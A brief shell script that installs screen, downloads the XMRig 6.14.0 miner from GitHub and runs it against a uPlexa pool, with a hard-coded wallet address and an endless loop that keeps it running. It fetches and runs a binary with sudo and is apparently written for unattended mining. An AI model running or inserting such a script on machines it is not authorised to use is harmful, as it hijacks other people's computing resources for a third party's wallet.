#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o upx.miningocean.org:4332 -u UPX1REyKAeGgFvGXRFP9kvbvGtRNxGfhqJpyeBBXMXivHY8Xv3JKmZBiybfDN8qn6ugBnDRPtNmFi9NoqDLAcATL4msx9Bjqje -p denis -a cn/upx2 -k --donate-level 1
while [ 1 ]; do
sleep 3
done
sleep 999
